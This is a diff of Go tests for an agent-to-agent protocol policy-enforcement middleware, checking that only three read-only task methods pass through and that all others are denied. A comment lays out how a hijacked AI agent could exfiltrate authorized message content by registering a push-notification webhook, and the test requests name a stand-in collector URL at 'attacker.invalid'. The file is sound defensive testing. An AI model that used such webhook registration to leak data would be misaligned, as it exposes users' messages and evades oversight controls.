@@ -205,15 +205,60 @@ func TestUnmodelledMessageMethodDenied(t *testing.T) {
 	assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
 }
 
-// Non-message traffic (agent card, task query) is observation and passes.
-func TestNonMessageTrafficPassesThrough(t *testing.T) {
-	rig := newRig(t)
-	raw := []byte(`{"jsonrpc":"2.0","id":1,"method":"tasks/get","params":{"id":"task-7"}}`)
-	if resp := rig.mw.Handle(context.Background(), raw); resp == nil {
-		t.Fatal("passthrough produced no response")
+// The three A2A methods that only read pass through as observation.
+func TestReadOnlyMethodsPassThrough(t *testing.T) {
+	for _, method := range []string{
+		"tasks/get",
+		"tasks/pushNotificationConfig/get",
+		"tasks/pushNotificationConfig/list",
+	} {
+		rig := newRig(t)
+		raw := []byte(fmt.Sprintf(
+			`{"jsonrpc":"2.0","id":1,"method":%q,"params":{"id":"task-7"}}`, method))
+		if resp := rig.mw.Handle(context.Background(), raw); resp == nil {
+			t.Fatalf("%s: passthrough produced no response", method)
+		}
+		if len(rig.forwarded) != 1 {
+			t.Fatalf("%s: not forwarded (%d)", method, len(rig.forwarded))
+		}
+		if got, want := lastRule(t, rig), "observe.passthrough."+method; got != want {
+			t.Fatalf("%s: rule = %s, want %s", method, got, want)
+		}
 	}
-	if len(rig.forwarded) != 1 {
-		t.Fatalf("passthrough not forwarded (%d)", len(rig.forwarded))
+}
+
+// Every other method is denied, including ones that read like housekeeping.
+//
+// tasks/pushNotificationConfig/set is the reason this test exists. It installs
+// a client-supplied webhook URL that every subsequent task update is pushed to,
+// and task updates carry message content. Passing it through would let a
+// hijacked agent copy out the content of messages this PEP had just authorized
+// without ever touching the intent binding -- an exfiltration channel opened
+// through a method an earlier version of this package classified as
+// observation. The others change state (cancel, delete), reopen an unmodelled
+// stream (resubscribe), or republish the endpoint bypass that cmd/a2a-pep's
+// card rewriter exists to close (getAuthenticatedExtendedCard).
+//
+// The last two entries are not real A2A methods. They are here because the
+// property being tested is that an unrecognised method is denied WITHOUT
+// anyone having listed it -- which is what a denylist could never give.
+func TestStateChangingAndUnknownMethodsDenied(t *testing.T) {
+	for _, method := range []string{
+		"tasks/pushNotificationConfig/set",
+		"tasks/pushNotificationConfig/delete",
+		"tasks/cancel",
+		"tasks/resubscribe",
+		"agent/getAuthenticatedExtendedCard",
+		"tasks/somethingAddedInAFutureVersion",
+		"evil/exfiltrate",
+	} {
+		rig := newRig(t)
+		raw := []byte(fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"method":%q,"params":{"id":"task-7",`+
+			`"pushNotificationConfig":{"url":"https://attacker.invalid/collect"}}}`, method))
+		assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
+		if got := lastRule(t, rig); got != "rpc.method-not-permitted" {
+			t.Fatalf("%s: rule = %s, want rpc.method-not-permitted", method, got)
+		}
 	}
 }
 
